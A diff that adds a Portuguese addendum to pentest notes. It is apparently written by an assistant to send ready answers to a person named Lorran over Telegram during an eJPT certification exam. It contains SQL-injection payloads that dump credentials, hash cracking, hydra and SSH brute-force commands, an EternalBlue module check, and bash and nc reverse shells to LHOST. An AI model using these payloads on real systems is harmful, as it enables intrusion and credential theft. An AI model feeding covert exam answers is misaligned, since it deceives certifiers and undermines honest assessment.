@@ -504,3 +504,96 @@ searchsploit webmin 1.920
 searchsploit -m 42315
 ```
 
+---
+
+# ADENDO 21/OUT — VALIDADO NO LAB HOJE (usar como resposta pronta)
+
+Cada item abaixo foi executado hoje contra um alvo real do lab. Se Lorran mandar o cenário
+correspondente no Telegram, é isto que eu respondo — sem inventar.
+
+## C (Web) — SQLi autenticada: a sequência que funciona
+
+O erro clássico é rodar sqlmap direto na URL e receber "not injectable" porque a página exige
+sessão (redireciona pro login). Ordem correta:
+
+```bash
+# 1) descobre o formulário e se tem CSRF
+curl -s http://IP/login.php | grep -iE "input|form action"
+
+# 2) loga guardando a sessão (Python — modelo: ~/LIBERTUS/ejpt/web_login.py)
+python3 ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password --extra "Login=Login"
+
+# 3) valida manualmente que a injeção existe antes de gastar tempo com sqlmap
+curl -s -H "Cookie: PHPSESSID=...; security=low" \
+  "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit"
+
+# 4) sqlmap com o cookie
+sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=...; security=low" --batch --dbs --threads=4
+```
+Resultado real de hoje (DVWA): 4 técnicas — boolean-based blind, error-based, time-based blind,
+UNION (2 colunas); DBMS `MySQL >= 5.0 (MariaDB fork)`; `--dbs` → `dvwa`.
+Extração: `sqlmap ... --cookie="..." -D dvwa -T users -C user,password --dump --batch`.
+
+**Se o alvo for SPA/JSON (Juice Shop e similares)** o sqlmap tende a desistir por causa do
+parêntese. Payload manual verificada hoje:
+```bash
+curl -s -G "http://IP/rest/products/search" \
+  --data-urlencode "q=test')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
+# retornou a tabela Users: admin@juice-sh.op / 0192023a7bbd73250516f069df18b500 (md5 de admin123)
+john --format=raw-md5 --wordlist=~/wordlists/pass/top10k.txt <(echo 'admin:0192023a7bbd73250516f069df18b500')
+```
+
+## B/C/D — hydra: onde ele engana (testado hoje)
+
+`http-get` deu `login: admin password: admin` num formulário cuja senha real é `password`.
+**Falso positivo.** Só usar com `F=` explícito:
+```bash
+hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \
+  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+```
+Com CSRF token no formulário → hydra não serve (token muda por request); usar Python/`requests`
+ou Burp Intruder.
+
+## D (SSH) — comando exato desta máquina
+
+```bash
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 \
+  -l /home/libertus/wordlists/user/top-usernames.txt \
+  -P /home/libertus/wordlists/pass/top10k.txt -T 8
+```
+Medido hoje: `msfadmin:msfadmin` em 0,1 s (2 tentativas, 2 threads). `python3` sem venv → falta
+paramiko. Alternativa com sessão: `msf ssh_login` com `VERBOSE true`.
+
+## A (SMB) e E (Pivot) — o que confirmar antes
+
+```bash
+# o banco do msf está de pé? (hoje: sim)
+msfdb status | head -5
+
+# módulo existe e está saudável? 2 segundos, evita travar no meio do cenário
+msfconsole -q -x "info exploit/windows/smb/ms17_010_eternalblue; exit" | head -15
+
+# scan que já entra no banco (pivot fica trivial depois)
+db_nmap -sV -p445 IP ; services -p 445
+```
+Regra do snap que já custou tempo: **resource script só funciona em `$HOME` sem ponto no nome**
+(`/tmp/x.rc` → "Cannot find resource script"; `~/.x.rc` → Permission denied; `~/x.rc` → OK).
+Para 1-2 comandos, sempre `-x`.
+
+## F (Shell/transferência) — nc confirmado
+
+Listener `nc -lvnp 4444` + conexão real recebeu `LIBERTUS_NC_OK` hoje. `nc` é OpenBSD: **sem `-e`**.
+Reverse shell:
+```bash
+bash -i >& /dev/tcp/LHOST/4444 0>&1
+# ou
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST 4444 > /tmp/f
+```
+
+## Regra de ouro do dia
+Antes de mandar qualquer comando pro Lorran no exame: **1) o alvo responde? 2) a ferramenta
+existe nesta máquina? 3) a saída é coerente?** Se a saída for "boa demais" (senha achada na
+primeira tentativa de http-get, banco inteiro sem esforço), desconfiar — hydra e sqlmap mentem.
+
+
